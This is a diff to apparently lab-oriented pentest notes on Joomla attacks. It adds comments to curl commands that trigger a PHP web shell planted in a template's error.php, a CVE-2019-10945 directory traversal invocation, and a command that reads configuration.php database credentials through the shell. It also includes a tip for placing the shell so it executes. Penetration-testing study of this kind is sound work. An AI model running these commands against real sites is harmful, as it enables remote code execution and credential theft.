@@ -27,6 +27,7 @@ Two reliable Joomla attack paths:
    curl -s "http://target/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
    # uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
+> Triggers the PHP shell planted in the template's error.php; swap `target`, the template, the param name, and the command.
 
 ### Template path pattern
 ```
@@ -66,6 +67,7 @@ python2.7 joomla_dir_trav.py \
 
 # Python3 version available separately
 ```
+> Exploits CVE-2019-10945 directory traversal to list arbitrary directories; swap `target`, the creds, and `--dir`.
 
 ### What it finds
 Lists directory contents (not file contents). Combine with curl to read interesting files:
@@ -74,6 +76,7 @@ Lists directory contents (not file contents). Combine with curl to read interest
 curl -s http://target/templates/protostar/error.php?cmd=cat+/var/www/dev.inlanefreight.local/configuration.php
 # OR access config directly if readable (usually not via HTTP — it's PHP)
 ```
+> Reads Joomla's configuration.php (DB creds) via the template shell; swap `target`, the shell path, and the config path.
 
 ### configuration.php secrets
 The Joomla config file typically contains:
@@ -127,6 +130,7 @@ curl -s "http://dev.inlanefreight.local/templates/protostar/error.php?shell=cat+
 
 # 7. Restore error.php via template editor — verify shell gone (0 bytes response)
 ```
+> Full Joomla template-RCE lab chain: plant shell in error.php, run id, list webroot, read the flag; swap the host and flag path.
 
 **JEXEC gotcha:** Joomla template files have `defined('_JEXEC') or die;` near the top. Appending a shell at the end = empty response on direct access. Must insert shell BEFORE that line (right after `<?php`).
 
